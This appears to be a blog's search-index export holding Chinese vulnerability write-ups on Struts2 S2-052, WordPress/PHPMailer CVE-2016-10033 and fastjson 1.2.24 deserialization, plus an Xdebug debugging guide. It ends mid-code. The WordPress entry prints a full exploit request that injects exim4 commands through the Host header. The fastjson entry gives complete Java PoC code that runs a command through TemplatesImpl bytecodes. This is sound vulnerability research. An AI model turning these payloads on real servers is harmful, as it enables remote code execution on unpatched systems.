    <content type="text"><![CDATA[综述2017年9月5日，Apache Struts发布最新的安全公告，Apache Struts 2.5.x和2.3.x的REST插件存在远程代码执行的高危漏洞，漏洞编号为CVE-2017-9805（S2-052）。漏洞的成因是由于使用XStreamHandler反序列化XStream实例的时候没有任何类型过滤导致远程代码执行。相关链接如下：https://cwiki.apache.org/confluence/display/WW/S2-052影响版本：Struts 2.1.2 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12规避方案立即升级到Struts 2.5.13 or Struts 2.3.34 技术分析根据官方的描述信息来看，是REST插件使用到XStreamHandler处理xml数据的时候，由于未对xml数据做任何过滤，在进行反序列将xml数据转换成Object时导致的RCE。 0x01 环境搭建从官方地址（https://archive.apache.org/dist/struts/2.5/struts-2.5-all.zip）下载所有源码包，找到其中的struts2-rest-showcase.war直接部署到tomcat就行，当然我更喜欢手动编译，直接通过Maven编译即可。具体的部署过程这里就不详细描述，不过有点是需要注意的，由于javax.imageio的依赖关系，我们的环境的jdk版本需要是jdk8以上，jdk8某些低版本也是不行的，本文作者的版本是jdk8_102，后续的一些验证都是在这个版本上做的 0x02 补丁分析环境搭建好了之后，首先我们来看下rest插件的相关配置 从这个文件中就可以看出XStreamHanler就是Content-Type:xml的默认处理句柄，而且可以看出xml是默认支持格式，这也就是说存在rest插件就会存在XStream的反序列化漏洞。接着看看官方的修复方案，补丁地址：https://github.com/apache/struts/commit/19494718865f2fb7da5ea363de3822f87fbda264在官方的修复方案中,主要就是将xml中的数据白名单化，把Collection和Map，一些基础类，时间类放在白名单中，这样就能阻止XStream反序列化的过程中带入一些有害类。 0x03 POC的生成目前公开的Poc是基于javax.imageio的，这是能直接本地执行命令，但是marshelsec提供了11个XStream反序列化库，其中大部分都是基于JNDI，具体包含：CommonsConfiguration, Rome, CommonsBeanutils, ServiceLoader, ImageIO, BindingEnumeration, LazySearchEnumeration, SpringAbstractBeanFactoryPointcutAdvisor, SpringPartiallyComparableAdvisorHolder, Resin, XBean从外部请求类完成反序列化。 0x04 漏洞验证及简单分析下图是一个简单的验证分析图，从Poc中可以看出，请求是PUT，请求的url后缀带xml，请求的Content-Type为delicious/bookmark+xml，请求的xml的前缀是&lt;set&gt;. 接着我们看下触发的执行调用栈： 在XStreamHanler.toObject调用了XStream的fromXml，从而进入反序列化流程。 0x05 官方临时缓解措施不起作用官方给出的缓解措施&lt;constant name=&quot;struts.action.extension&quot; value=&quot;xhtml,,,json&quot; /&gt;，从字面意思也能看出来，这个是针对action的后缀的，也就是说如果后缀不带xml也就可以绕过。下面给出测试用例，从我们的poc中也可以看出，POST请求不带xml的后缀直接忽视这个缓解措施。所以说Struts的官方也不怎么复制，没测试过的东西就直接放出来。XStream只跟Content-Type有关，如果Content-Type中含有xml，则会交给XStream处理，所以poc该怎么使还怎么使，并且目前最大的问题就是国内的解决都是使用的这个无效的官方解决方案，下面看下我们的验证： 从图上可以看出，我们已经去除了xml的支持，下面来看看Payload的执行效果： 成功弹出计算器，这也就验证了我们的想法。同时通过两个不同poc的比较，我们也能发现一些端倪，Content-Type支持xml的几种格式，POST请求，PUT请求，GET请求甚至是自定义请求都是能触发漏洞，我们可以将poc中&lt;map&gt;&lt;entry&gt;换成&lt;set&gt;也能触发漏洞。同时由于XStream本身的Poc多大十一种，做好安全防御确实比较艰难。]]></content>
      <categories>
        <category>Struts2</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>反序列化</tag>
        <tag>Struts2</tag>
        <tag>S2-052</tag>
        <tag>CVE-2017-9805</tag>
        <tag>XStream</tag>
        <tag>xml</tag>
        <tag>imageio</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PhpStorm Xdebug远程调试环境搭建原理分析及问题排查]]></title>
    <url>%2F2017%2F05%2F23%2FPhpStorm%20Xdebug%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%8F%8A%E9%97%AE%E9%A2%98%E6%8E%92%E6%9F%A5%2F</url>
    <content type="text"><![CDATA[网上关于phpstorm调试的文章很多，真实实践过的不多，都是几篇文章转来转去，没有原理分析，甚至有些文章的配置文件都是错的，我就是按照一篇错误的配置一路走过来的，不过好歹把这些坑都给埋了，这篇文章不仅仅有操作，还有原理分析，更有问题排查思路。对于简单的工程，直接print_r();exit()已经足够，但是对于大型项目有时就有点力不从心，如果直接将apache部署在本地，phpstorm调试本地代码这种方式也可以，我以前就是这么干的，这篇文章主要介绍远程调试系问题排除。 1，环境介绍本地：windows7（192.168..）+ phpstorm8远程：Ubuntu14.04（192.168.3.206）+ apache2 + php5 2 远程环境配置2.2 xdebug安装Ubuntu下直接apt-get安装，安装命令如下：apt-get install php5-xdebug 2.3 配置首先通过locate定位到xdebug.ini，这个位置一定得对，在Ubuntu上位于/etc/php5/apache2/conf.d/20-xdebug.ini 123456789101112131415zend_extension=xdebug.soxdebug.idekey=PHPSTORMxdebug.remote_connect_back = 1；//如果开启此，将忽略下面的 xdebug.remote_host 的参数；xdebug.remote_host=192.168.x.x; //注意这里是，客户端的ip&lt;即IDE的机器的ip,不是你的web server&gt;xdebug.remote_enable=onxdebug.remote_port = 9001;//注意这里是，客户端的端口&lt;即IDE的机器的ip,不是你的web server&gt;xdebug.remote_handler = dbgpxdebug.auto_trace = 1xdebug.remote_log = /tmp/xdebug.log 3 本地phpstorm配置下面的配置有执行顺序要求，请一步一步来。 3.1 下载远程代码phpstorm在新建项目的时候提供了选项，可以通过ftp/sftp远程下载代码，直接按照提示下一步下一步就可以。 3.2 添加php解释器通过file-&gt;settings-&gt;Languages &amp; Frameworks找到php栏， 3.3 配置Debug路径还是在file-&gt;settings-&gt;Languages &amp; Frameworks-&gt;PHP，选择Debug，选择要监听的端口，这里设置为9001，如图所示： 设置完端口还需要设置DBGp Proxy，配置如下： 在设置完Debug页面后，在DBGp Proxy页面的端口已经确定，添加上IDE key为刚才xdebug配置文件设置的key:PHPSTORM,Host则为要调试的远程主机。 3.4 配置Server通过通过file-&gt;settings-&gt;Languages Frameworks-&gt;PHP找到Servers，Host对应远程主机IP,Debugger选用Xdebug，如果是远程调试，一定得开启路径映射功能，否则无法调试，本地的路径不用选，在新建远程项目的时候就已经确定，Absolute path on the server则是远程主机的Web路径。在途中红框上方有一个Validate remote environment可以用来验证远程的Xdebug配置，如果配置明显不对的话，会有提示信息，可按照提示信息修改远程服务器的xdebug配置。 3.5 配置调试选项由于调试的目标是一个项目，所以这里需要设置PHP Web Application，配置中Server：远程目标主机，Start URL设为/,设置完之后会在左侧新建一个PHP Web Application 到目前为止，该配置的都已经配置完成，这里面配置的选项比较多，一步一步配置，有顺序要求。配置完之后就是调试。点击下图右边红框中的小按钮，打开xdebug监听，再选择我们要调试的目标，这里是server，最后点击那个调试按钮，就能开启调试之旅。打开xdebug监听的时候，可以看到IDE已经在本地建立监听服务，具体如下： 可以看到调试页面。如下所示 3.6 浏览器添加书签或者Xdebug Helper前面描述的是通过PHPStorm的debug按钮，发送类似?XDEBUG_SESSION_START=17212这种请求调起浏览器来达到调试的目的，但是这种方式只能调起首页，存在缺陷。下面介绍另外一种启动调试的方式，就是通过浏览器中带XDEBUG_SESSION的cookie直接发起，可以安装Chrome插件Xdebug Helper或者添加浏览器的调试插件、或书签来达到目的。新建书签的url：https://www.jetbrains.com/phpstorm/marklets/，这里就不再做示例，插件和书签的原理都是一样的，都是在cookie中添加XDEBUG_SESSION=PHPSTORM。 4 数据流程前面的配置完全是一个操作指南，如果仅仅是为了配置，上面的内容已经足够，但是如果配置中遇到什么问题，就需要接下来的原理分析。古人说的好，我们得知其然还得知其所以然。 4.1 Xdebug工作原理1，IDE（如PhpStorm）已经集成了一个遵循BGDP的Xdebug插件，当开启它的时候， 会在本地开一个xdebug调试服务，监听在调试器中所设置的端口上，默认是9000，这个服务就会监听所有到9000端口的链接。在PhpStorm中，位于：工具栏 &gt; Run &gt; Start / Stop Listening for PHP Xdebug Connetions。2，当浏览器发送一个带XDEBUG_SESSION_START的参数的请求到服务器时，服务器接受后将其转到后端的php处理，如果php开启了xdebug模块，则会将debug信息转发到客户端IP的IDE的调试端口上。当参数或者cookie信息中不带XDEBUG_SESSION_START，则不会启动调试。这就为后续在浏览器中添加开关提供了可能。Xdebug的官方给出了一个示例图：很好的展示了相互调用关系。这个示例图是绑定了ip，即使用了固定ip地址，xdebug.remote_connect_back = 0 ，也是 xdebug 的默认方式，这种情况下，xdebug 在收到调试通知时会读取配置 xdebug.remote_host 和 xdebug.remote_port ，默认是 localhost:9000，然后向这个端口发送通知，这种方式只适合单一客户端开发调试。 另外一种方式则是不绑定IP，Xdebug根据请求来源（REMOTE_HOST）来发起调试。示例图如下： 那从用户发起请求到，到IDE的整个流程图如下： 当用户的请求参数或者cookie中不带调试信息，数据流就是浏览器到Apache（或其他web容器）到PHP，如果加上了调试参数，则请求还会由PHP转给Xdebug处理，Xdebug再把信息转发给IDE，完成调试功能。 5 问题分析由于拷贝了错误的Xdebug参数，导致走了不少弯路，如果仅仅是为了配置PhpStorm及Xdebug原理，关注前面部分即可。下面主要分析排除过程。错误得配置如下：123456789101112131415161718zend_extension=xdebug.soxdebug.idekey=PHPSTORM#xdebug.remote_connect_back = 1 //如果开启此，将忽略下面的 xdebug.remote_host 的参数xdebug.remote_host=192.168.x.x //注意这里是，客户端的ip&lt;即IDE的机器的ip,不是你的web server&gt;xdebug.remote_enable=onxdebug.remote_port = 9001 //注意这里是，客户端的端口&lt;即IDE的机器的ip,不是你的web server&gt;xdebug.remote_handler = dbgpxdebug.auto_trace = 1xdebug.collect_includes = 1xdebug.collect_params = 1;xdebug.collect_return = 1xdebug.remote_autostart = 1xdebug.remote_log = /tmp/xdebug.log 问题现象：Apache反应奇慢无比，一个普通请求能耗时10分钟，但是最终会有效应。排查过程： 5.1 问题背景本地环境：Windows7，远程服务器：Ubuntu14.04，这个远程服务器是本地环境下VMWare WorkStation下的一台虚拟机，网络连接方式是桥接。在调试远程项目时，作者使用的sftp来管理服务器的资源，这里面就会涉及到权限的问题。远程服务器只开了一个普通账户liaoxinxi，而/var/www 目录以前是root权限的，由于PhpStorm调试时会在远程服务器web目录下创建一个文件，这必然会导致权限问题，为了解决这个问题，执行chmod liaoxinxi:liaoxinxi /var/www -R将web目录修改为liaoxinxi用户所有。当然为了远程调试，我配置了xdebug.ini，这个配置参数当时也不是太清楚具体含义，比较着急，就从某篇号称亲手测试过可用的xdebug环境拷贝而来。下午比较混沌，当时做过的操作还挺多，xdebug这个配置我居然忘记我配过了，只记得修改了权限相关内容。重启Apache之后，web请求响应奇慢无比。 5.2 疑问点5.2.1，权限当时一股脑的认为是权限的问题，就又把web目录权限全改为777，还是奇慢无比，查看apache日志也没有半点异常。 5.2.2 网络无意之中发现在远程服务器上直接访问，很快就能得到响应。这个远程服务器是我VMware下的虚拟机，通过桥接模式与宿主机通信。中午与其他同事讨论这个问题的时候将问题排查点转移到网络环境。怀疑是网络的问题，将桥接模式改成NAT，又是重启虚拟机，重启宿主机，都不起作用。 5.2.3 Apache配置于是又将矛盾转移到Apache的配置上，Apache的配置文件被我改动了很多回，当时觉得很简单所以没设置备份点，一个好的备份是多么重要。只能重装，这个在Ubuntu下还是很简单的，一条命令搞定apt-get auto-remove --purge apache2，并且删除了原有的配置文件。再通过apt-get重新安装，apt-get install apache2,重启apache后发现在本地访问，很快得到响应，不过响应的都是原始的php文件，再安装一下libapache2php模块，安装完之后，响应还是一样的奇慢无比。难道跟这个模块有关系，但是找不到相关资料。再翻看安装apache2的输出信息时发现其重启了xdebug模块，回想一下，是不是这些模块导致的问题呢？再仔细想想，那天下午好像还改了xdebug的配置，可能有问题。 5.2.4 Xdebug配置回到Xdebug的配置文件，其中一个配置xdebug.remote_host=192.168.*.* //这个配置是用来，感觉峰回路转了，因为只有这个ip访问就会奇慢无比，于是注释掉，再重启apache访问，果然奇慢无比的问题解决了。但是这又带来一个新的问题，这个ip是我的本地环境，如果不配置的话怎么调试呢？于是将//后边的内容用;注释起来，前期一直以为//也是个注释。//这种注释方式在xdebug中不识别，所以根本不会向IDE所在机器发送调试包，会一直等到超时，所以就会特别慢。 再去调试，在index.php下断点，终于断下来了。调试的过程中发现，开启或者未开启调试参数都会直接进入调试模式，见了鬼了，回想起调试流程图，肯定出问题的地方在xdebug的配置，打开配置文件，果然发现一个相关参数xdebug.remote_autostart = 1，这个参数的意思就是自动打开远程调试，注释掉就能接收不使用Xdebug调试的参数。说到最后不得不佩服这位兄弟，挖了两个大大的坑（坑的位置：http://www.51testing.com/html/18/170218-3538738.html），好歹我全埋了，提醒大家尽量找官方文档，如果官方文档写的不详细的，还是多见识见识几份文档。 综合来看，信息大爆炸的年代，干扰信息太多，各位见仁见智。]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>PhpStorm</tag>
        <tag>Xdebug</tag>
        <tag>远程调试</tag>
        <tag>Xdebug原理</tag>
        <tag>Apache响应慢</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WordPress远程代码执行环境构造和VirtualHost环境验证]]></title>
    <url>%2F2017%2F05%2F05%2FWordPress%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%8E%AF%E5%A2%83%E6%9E%84%E9%80%A0%E5%92%8CVirtualHost%E7%8E%AF%E5%A2%83%E9%AA%8C%E8%AF%81%2F</url>
    <content type="text"><![CDATA[背景当地时间5月3日（北京时间5月4日凌晨），WordPress被曝出存在严重的安全隐患。一则关于漏洞CVE-2016-10033的新POC被爆出。这是一个PHPMailer的漏洞，WordPress 4.6使用了存在该漏洞的PHPMailer，出于安全考虑，WordPress官方在4.7.1中更新了PHPMailer，解决了这个问题。但PHPMailer漏洞的原作者，又发现了一个针对PHPMailer在使用exim4 MTA时的利用方法。新POC的曝出也表示着WordPress 4.6版本均受影响。rce 原始出处 这里面的核心点就是作者提供了可用的针对WordPress的利用方法，利用的攻击向量就是exim4 MTA. 环境搭建本文作者直接用的Ubuntu 14.04，WordPress 4.6，其他都是通过apt-get安装搭建的环境。我看有童鞋通过docker这种方式来搭建环境，遇到的坑实在太多，可以参考下这个。简单示例下：由于是利用的exim4 MTA的攻击向量，这在Ubuntu14.04是默认不存在的。 安装exim4通过apt-get install exim4直接安装,安装完的效果如下： 12345liaoxinxi@ubuntu:/var/www/WordPress-4.6$ ls -al /usr/sbin/sendmaillrwxrwxrwx 1 root root 5 Jan 5 23:10 /usr/sbin/sendmail -&gt; exim4liaoxinxi@ubuntu:/var/www/WordPress-4.6$ sudo netstat -anp|grep ":25"tcp 0 0 127.0.0.1:25 0.0.0.0:* LISTEN 1683/exim4tcp6 0 0 ::1:25 :::* LISTEN 1683/exim4 apt-get安装完会在系统建立sendmail的软连接，这个软连接直接指向了exim4，当然也就不需要再安装sendmail了。安装完之后会在系统的25号端口建立监听。 安装Mysql，设置数据库接下来就是wordpress的安装，这个网上的文章很多，看权威文档即可，下面是记录文档。数据库的安装，本来系统有个mysql数据库，但是忘记root密码，试了好多遍，好吧，只能卸载了重装，这个卸载的一定得把数据清除了，不然root密码还是原来的。附安装脚本： 1231 sudo apt-get install mysql-server2 sudo apt-get install mysql-client3 sudo apt-get install php5-mysqlnd-ms 在装数据库的时候会弹出让你填入root用户名和密码，直接写入就可以，记得后续得用到创建数据库表： 1234mysql&gt; CREATE DATABASE wp_myblog;mysql&gt; GRANT ALL PRIVILEGES ON wp_myblog.* TO 'wordpress'@'localhost' IDENTIFIED BY 'wordpress';mysql&gt; FLUSH PRIVILEGES;mysql&gt; EXIT; 配置Apache解压WordPress的zip包到web目录，设置apache2配置文件。WordPress 4.6的下载地址：https://github.com/WordPress/WordPress/archive/4.6.zip，apach2的简单配置如下,就是设置DocumentRoot指向刚才解压后WordPress的路径： 12345678910111213vi /etc/apache2/sites-enabled/000-default.conf 35 &lt;VirtualHost *:80&gt; 36 # The ServerName directive sets the request scheme, hostname and port that 37 # the server uses to identify itself. This is used when creating 38 # redirection URLs. In the context of virtual hosts, the ServerName 39 # specifies what hostname must appear in the request's Host: header to 40 # match this virtual host. For the default virtual host (this file) this 41 # value is not decisive as it is used as a last resort host regardless. 42 # However, you must set it for any further virtual host explicitly. 43 #ServerName www.example.com 44 ServerName www.a.com 46 DocumentRoot /var/www/WordPress-4.6/ 配置WordPress wp-config编辑wp-config.php，首先sudo cp wp-config-sample.php wp-config.php,修改如下： 123456723 define(&apos;DB_NAME&apos;, &apos;wp_myblog&apos;);2425 /** MySQL database username */26 define(&apos;DB_USER&apos;, &apos;wordpress&apos;);2728 /** MySQL database password */29 define(&apos;DB_PASSWORD&apos;, &apos;wordpress&apos;); 重启进程最后重启数据库，apache2 12sudo /etc/init.d/apache2 restartsudo/etc/init.d/mysql start 重启完之后访问我们的设置的IP或者域名，按照提示一步步设置即可。不过得记住具体设置的用户名或者email地址，这个在后续的poc中会用到。 VirtualHost 环境验证在实际的应用中，很多时候都会用到VirtualHost来配置主机和域名的对应关系，在原作者的payload也提到了是利用了默认的Apache2配置，那么不是默认的Apache2配置呢？设置了ServerName的这种情况呢？经测试发现，不修改Poc的话，直接访问该IP，Apache会将请求交给第一个VirtualHost处理。那如果修改Poc呢，笔者尝试修改完之后能达到访问任意VirtualHost环境，这就避免了原作者必须利用默认配置的情况，这样的话这个漏洞的威力又大了一成。下面附上设置的VirtualHost环境，大家可以尝试修改试试，这个针对带多个VirtualHost的poc暂时先不公布，大家可以先仔细测测,肯定是可以的，笔者的环境中WordPress即不在第一个VirtualHost上，也是能被攻击的。 1234567891011121314&lt;VirtualHost *:80&gt; ServerAdmin webmaster@localhost ServerName www.b.com DocumentRoot /var/www/DVWA-1.9 ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined&lt;/VirtualHost&gt;&lt;VirtualHost *:80&gt; ServerName www.a.com DocumentRoot /var/www/WordPress-4.6/ ErrorLog $&#123;APACHE_LOG_DIR&#125;/error1.log CustomLog $&#123;APACHE_LOG_DIR&#125;/access1.log combined&lt;/VirtualHost&gt; poc 简单解读这个解读会比较简单，大家可以参考原作者公布的blog,真是不得不服人家，写的有理有据，包括怎么发现的，参考的文档，怎么绕过的，一步步的绕过历程都写得清清楚，值得细读。 123456POST /wp-login.php?action=lostpassword HTTP/1.1Host: xenial(tmp1 -be $&#123;run&#123;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;usr$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;bin$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;touch$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;tmp$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;test&#125;&#125; tmp2)Content-Type: application/x-www-form-urlencodedContent-Length: 64user_login=wordpress&amp;redirect_to=&amp;wp-submit=Get+New+Password 123456789101112HTTP/1.1 302 FoundDate: Thu, 04 May 2017 07:37:15 GMTServer: Apache/2.4.7 (Ubuntu)X-Powered-By: PHP/5.5.9-1ubuntu4.21Expires: Wed, 11 Jan 1984 05:00:00 GMTCache-Control: no-cache, must-revalidate, max-age=0Set-Cookie: wordpress_test_cookie=WP+Cookie+check; path=/X-Frame-Options: SAMEORIGINLocation: wp-login.php?checkemail=confirmContent-Length: 0Connection: closeContent-Type: text/html; charset=UTF-8 原作者主要是利用了Host中可以包含注释来夹带私货，来绕过域名中不能包含空格的问题（注释中域名部分可带空格来分割sendmail的参数），在WordPress中filter_var/FILTER_VALIDATE_EMAIL中和PHPMailer library库中validateAddress(）都是参考的RFC 822，实现都是一样的。一个简单的注释示例如john@example.com(comment),而且域名部分可以包含空格。这就可以将参数传递到sendmail的第五个，第六个参数。为了绕过不能/的问题，作者尝试了perl，base64/hex，最终选定了substr来提取exim4自带的默认参数，${substr{0}{1}{$spool_directory} 来替代 用 /,${substr{10}{1}{$tod_log}} 来替代空格，这样就可以搞定一个命令执行。其实exim中涉及的变量还挺多，还有些是可以利用的。/usr/bin/touch /tmp/test,对于上面提供的poc得注意user_login必须是存在的，这个也在文章中设置wordpress的时候提到过，可以是用户名或者邮箱,提供的不对的话会报用户不存在的错误。]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>WordPress</tag>
        <tag>远程代码执行</tag>
        <tag>VirtualHost</tag>
        <tag>poc</tag>
        <tag>exim4</tag>
        <tag>phpmail</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[fastjson 远程反序列化poc的构造和分析]]></title>
    <url>%2F2017%2F05%2F03%2Ftitle-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[fastjson 反序列化 poc 1.2.24 2017.5.3日更新：增加_tfactory为一个空object即{ }，使poc在各个jdk版本都起作用。影响版本更新：fastjson-1.2.22到1.2.24区间1 背景fastjson是一个java编写的高性能功能非常完善的JSON库，应用范围非常广，在github上star数都超过8k，在2017年3月15日，fastjson官方主动爆出fastjson在1.2.24及之前版本存在远程代码执行高危安全漏洞。攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。关于漏洞的具体详情可参考 https://github.com/alibaba/fastjson/wiki/security_update_20170315 2 受影响的版本fastjson &lt;= 1.2.24 3 静态分析根据官方给出的补丁文件，主要的更新在这个checkAutoType函数上，而这个函数的主要功能就是添加了黑名单，将一些常用的反序列化利用库都添加到黑名单中。具体包括1bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework 下面我们来分析checkAutoType的函数实现：123456789101112131415161718192021222324252627282930313233343536373839public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123; if (typeName == null) &#123; return null; &#125; if (typeName.length() &gt;= maxTypeNameLength) &#123; throw new JSONException("autoType is not support. " + typeName); &#125; final String className = typeName.replace('$', '.'); if (autoTypeSupport || expectClass != null) &#123; for (int i = 0; i &lt; acceptList.length; ++i) &#123; String accept = acceptList[i]; if (className.startsWith(accept)) &#123; return TypeUtils.loadClass(typeName, defaultClassLoader); &#125; &#125; for (int i = 0; i &lt; denyList.length; ++i) &#123; String deny = denyList[i]; if (className.startsWith(deny)) &#123; throw new JSONException("autoType is not support. " + typeName); &#125; &#125; &#125; Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName); if (clazz == null) &#123; clazz = deserializers.findClass(typeName); &#125; if (clazz != null) &#123; if (expectClass != null &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123; throw new JSONException("type not match. " + typeName + " -&gt; " + expectClass.getName()); &#125; return clazz; &#125; 核心部分就是denyList的处理过程，遍历denyList，如果引入的库以denyList中某个deny打头，就会抛出异常，中断运行。 4 POC构造静态分析得知，要构造一个可用的poc，肯定得引入denyList的库。刚开始fastjson官方公布漏洞信息时，当时就尝试构造poc，怎奈fastjson的代码确实庞大，还有asm机制，通过asm机制生成的临时代码下不了断点。当时也只能通过在通过类初始化的时候弹出一个计算器，很显然这个构造方式不具有通用性，最近jackson爆出反序列漏洞，其中就利用了TemplatesImpl类，而这个类有一个字段就是_bytecodes，有部分函数会根据这个_bytecodes生成java实例，简直不能再更妙，这就解决了fastjson通过字段传入一个类，再通过这个类执行有害代码。后来阅读ysoserial的代码时也发现在gadgets.java这个文件中也使用到了这个类来动态生成可执行命令的代码。下面是一个poc的代码 1234567891011121314151617181920212223242526import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.IOException;public class Test extends AbstractTranslet &#123; public Test() throws IOException &#123; Runtime.getRuntime().exec("calc"); &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) &#123; &#125; @Override public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException &#123; &#125; public static void main(String[] args) throws Exception &#123; Test t = new Test(); &#125;&#125; 这个是Test.java的实现，在Test.java的构造函数中执行了一条命令，弹出计算器。编译Test.java得到Test.class供后续使用。后续会将Test.class的内容赋值给_bytecodes。接着分析poc 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051package person;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.Feature;import com.alibaba.fastjson.parser.ParserConfig;import org.apache.commons.io.IOUtils;import org.apache.commons.codec.binary.Base64;import java.io.ByteArrayOutputStream;import java.io.File;import java.io.FileInputStream;import java.io.IOException;/** * Created by web on 2017/4/29. */public class Poc &#123; public static String readClass(String cls)&#123; ByteArrayOutputStream bos = new ByteArrayOutputStream(); try &#123; IOUtils.copy(new FileInputStream(new File(cls)), bos); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return Base64.encodeBase64String(bos.toByteArray()); &#125; public static void test_autoTypeDeny() throws Exception &#123; ParserConfig config = new ParserConfig(); final String fileSeparator = System.getProperty("file.separator"); final String evilClassPath = System.getProperty("user.dir") + "\\target\\classes\\person\\Test.class"; String evilCode = readClass(evilClassPath); final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"; String text1 = "&#123;\"@type\":\"" + NASTY_CLASS + "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'a.b','_tfactory':&#123; &#125;,\"_outputProperties\":&#123; &#125;," + "\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"&#125;\n"; System.out.println(text1); Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField); //assertEquals(Model.class, obj.getClass()); &#125; public static void main(String args[])&#123; try &#123; test_autoTypeDeny(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 在这个poc中，最核心的部分是_bytecodes，它是要执行的代码，@type是指定的解析类，fastjson会根据指定类去反序列化得到该类的实例，在默认情况下，fastjson只会反序列化公开的属性和域，而com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl中_bytecodes却是私有属性，_name也是私有域，所以在parseObject的时候需要设置Feature.SupportNonPublicField，这样_bytecodes字段才会被反序列化。_tfactory这个字段在TemplatesImpl既没有get方法也没有set方法，这没关系，我们设置_tfactory为{ },fastjson会调用其无参构造函数得_tfactory对象，这样就解决了某些版本中在defineTransletClasses()用到会引用_tfactory属性导致异常退出。接下来我们看下TemplatesImpl.java的几个关键函数： 12345678public synchronized Properties getOutputProperties() &#123; try &#123; return newTransformer().getOutputProperties(); &#125; catch (TransformerConfigurationException e) &#123; return null; &#125;&#125; 1234567891011121314151617public synchronized Transformer newTransformer() throws TransformerConfigurationException&#123; TransformerImpl transformer; transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory); if (_uriResolver != null) &#123; transformer.setURIResolver(_uriResolver); &#125; if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123; transformer.setSecureProcessing(true); &#125; return transformer;&#125; 12345678910111213141516171819202122232425262728private Translet getTransletInstance() throws TransformerConfigurationException &#123; try &#123; if (_name == null) return null; if (_class == null) defineTransletClasses(); // The translet needs to keep a reference to all its auxiliary // class to prevent the GC from collecting them AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); translet.postInitialization(); translet.setTemplates(this); translet.setServicesMechnism(_useServicesMechanism); if (_auxClasses != null) &#123; translet.setAuxiliaryClasses(_auxClasses); &#125; return translet; &#125; catch (InstantiationException e) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; catch (IllegalAccessException e) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; &#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950private void defineTransletClasses() throws TransformerConfigurationException &#123; if (_bytecodes == null) &#123; ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR); throw new TransformerConfigurationException(err.toString()); &#125; TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() &#123; public Object run() &#123; return new TransletClassLoader(ObjectFactory.findClassLoader()); &#125; &#125;); try &#123; final int classCount = _bytecodes.length; _class = new Class[classCount]; if (classCount &gt; 1) &#123; _auxClasses = new Hashtable(); &#125; for (int i = 0; i &lt; classCount; i++) &#123; _class[i] = loader.defineClass(_bytecodes[i]); final Class superClass = _class[i].getSuperclass(); // Check if this is the main class if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123; _transletIndex = i; &#125; else &#123; _auxClasses.put(_class[i].getName(), _class[i]); &#125; &#125; if (_transletIndex &lt; 0) &#123; ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name); throw new TransformerConfigurationException(err.toString()); &#125; &#125; catch (ClassFormatError e) &#123; ErrorMsg err = 